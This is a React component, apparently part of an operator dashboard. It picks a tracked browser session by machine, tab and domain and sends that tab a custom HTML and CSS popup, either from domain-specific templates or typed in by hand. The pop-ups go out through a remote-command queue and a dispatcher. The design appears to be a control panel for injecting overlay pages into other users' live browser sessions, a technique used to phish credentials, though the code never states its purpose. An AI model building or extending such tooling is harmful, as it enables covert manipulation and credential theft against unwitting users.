import { useState, useEffect } from "react";
import { Send, Eye } from "lucide-react";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Textarea } from "@/components/ui/textarea";

interface PopupTemplateModalProps {
  isOpen: boolean;
  onClose: () => void;
  session: {
    tab_id: string;
    machine_id: string;
    domain: string;
    url: string;
    title: string | null;
  };
}

interface Template {
  id: string;
  name: string;
  domain: string | null;
  html_content: string;
  css_styles: string | null;
}

const PopupTemplateModal = ({ isOpen, onClose, session }: PopupTemplateModalProps) => {
  const [templates, setTemplates] = useState<Template[]>([]);
  const [selectedTemplateId, setSelectedTemplateId] = useState<string>('');
  const [customHtml, setCustomHtml] = useState('');
  const [customCss, setCustomCss] = useState('');
  const [isSending, setIsSending] = useState(false);

  useEffect(() => {
    if (isOpen) {
      fetchTemplates();
    }
  }, [isOpen]);

  const fetchTemplates = async () => {
    const { data, error } = await supabase
      .from('popup_templates')
      .select('*')
      .order('is_default', { ascending: false });
    
    if (error) {
      toast.error('Erro ao carregar templates');
      return;
    }
    
    setTemplates(data || []);
  };

  const getSelectedTemplate = () => {
    if (selectedTemplateId === 'custom') {
      return { html_content: customHtml, css_styles: customCss };
    }
    return templates.find(t => t.id === selectedTemplateId);
  };

  const replaceVariables = (text: string) => {
    return text
      .replace(/\{\{domain\}\}/g, session.domain)
      .replace(/\{\{url\}\}/g, session.url)
      .replace(/\{\{timestamp\}\}/g, new Date().toLocaleString('pt-BR'))
      .replace(/\{\{machine_id\}\}/g, session.machine_id)
      .replace(/\{\{user_name\}\}/g, 'Usuário');
  };

  const renderPreview = () => {
    const template = getSelectedTemplate();
    if (!template) return <p className="text-muted-foreground">Selecione um template</p>;

    const html = replaceVariables(template.html_content);
    const css = template.css_styles || '';

    return (
      <div className="border rounded-lg p-4 bg-muted/50">
        <style>{css}</style>
        <div className="popup-overlay" style={{ position: 'relative', height: '400px' }}>
          <div dangerouslySetInnerHTML={{ __html: html }} />
        </div>
      </div>
    );
  };

  const handleSend = async () => {
    const template = getSelectedTemplate();
    if (!template) {
      toast.error('Selecione um template');
      return;
    }

    setIsSending(true);
    try {
      const { data: user } = await supabase.auth.getUser();
      
      const payload = {
        html_content: replaceVariables(template.html_content),
        css_styles: template.css_styles || ''
      };

      const { error: insertError } = await supabase
        .from('remote_commands')
        .insert({
          target_machine_id: session.machine_id,
          target_tab_id: session.tab_id,
          target_domain: session.domain,
          command_type: 'popup',
          payload,
          executed_by: user.user?.id
        });

      if (insertError) throw insertError;

      const { data, error } = await supabase.functions.invoke('command-dispatcher', {
        body: {
          command_type: 'popup',
          target_machine_id: session.machine_id,
          target_tab_id: session.tab_id,
          payload
        }
      });

      if (error) throw error;

      if (data?.status === 'sent') {
        toast.success('Popup enviado com sucesso!');
        onClose();
      } else {
        toast.warning('Máquina offline. Comando registrado para envio posterior.');
        onClose();
      }
    } catch (error) {
      console.error('Erro ao enviar popup:', error);
      toast.error('Erro ao enviar popup');
    } finally {
      setIsSending(false);
    }
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="max-w-4xl max-h-[90vh] overflow-y-auto">
        <DialogHeader>
          <DialogTitle className="text-xl">Enviar Popup Personalizado</DialogTitle>
          <DialogDescription>
            Selecione um template e envie para: {session.domain}
          </DialogDescription>
        </DialogHeader>

        <Tabs defaultValue="select" className="space-y-4">
          <TabsList>
            <TabsTrigger value="select">Selecionar Template</TabsTrigger>
            <TabsTrigger value="preview">
              <Eye className="w-4 h-4 mr-2" />
              Preview
            </TabsTrigger>
            <TabsTrigger value="custom">Custom HTML</TabsTrigger>
          </TabsList>

          <TabsContent value="select" className="space-y-4">
            <div>
              <Label>Template</Label>
              <Select value={selectedTemplateId} onValueChange={setSelectedTemplateId}>
                <SelectTrigger>
                  <SelectValue placeholder="Selecione um template" />
                </SelectTrigger>
                <SelectContent>
                  {templates.map((template) => (
                    <SelectItem key={template.id} value={template.id}>
                      {template.name}
                      {template.domain && ` (${template.domain})`}
                    </SelectItem>
                  ))}
                  <SelectItem value="custom">HTML Customizado</SelectItem>
                </SelectContent>
              </Select>
            </div>

            <Card>
              <CardHeader>
                <CardTitle className="text-base">Informações da Sessão</CardTitle>
              </CardHeader>
              <CardContent className="space-y-2 text-sm">
                <div className="grid grid-cols-2 gap-2">
                  <span className="font-medium">Domínio:</span>
                  <span className="font-mono">{session.domain}</span>
                  <span className="font-medium">URL:</span>
                  <span className="font-mono text-xs break-all">{session.url}</span>
                  <span className="font-medium">Máquina:</span>
                  <span className="font-mono">{session.machine_id}</span>
                  <span className="font-medium">Tab ID:</span>
                  <span className="font-mono">{session.tab_id}</span>
                </div>
              </CardContent>
            </Card>

            <div className="bg-muted/50 p-3 rounded-lg">
              <p className="text-xs text-muted-foreground">
                <strong>Variáveis disponíveis:</strong> {'{{domain}}'}, {'{{url}}'}, {'{{timestamp}}'}, {'{{machine_id}}'}, {'{{user_name}}'}
              </p>
            </div>
          </TabsContent>

          <TabsContent value="preview">
            <div>
              <Label>Preview do Popup</Label>
              {renderPreview()}
            </div>
          </TabsContent>

          <TabsContent value="custom" className="space-y-4">
            <div>
              <Label>HTML Customizado</Label>
              <Textarea
                value={customHtml}
                onChange={(e) => {
                  setCustomHtml(e.target.value);
                  setSelectedTemplateId('custom');
                }}
                className="font-mono text-sm min-h-[200px]"
                placeholder="<div>Seu HTML aqui...</div>"
              />
            </div>
            <div>
              <Label>CSS Customizado</Label>
              <Textarea
                value={customCss}
                onChange={(e) => setCustomCss(e.target.value)}
                className="font-mono text-sm min-h-[150px]"
                placeholder=".popup { ... }"
              />
            </div>
          </TabsContent>
        </Tabs>

        <DialogFooter>
          <Button variant="outline" onClick={onClose} disabled={isSending}>
            Cancelar
          </Button>
          <Button onClick={handleSend} disabled={isSending || !selectedTemplateId}>
            {isSending ? (
              <>
                <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin mr-2" />
                Enviando...
              </>
            ) : (
              <>
                <Send className="w-4 h-4 mr-2" />
                Enviar Popup
              </>
            )}
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
};

export default PopupTemplateModal;
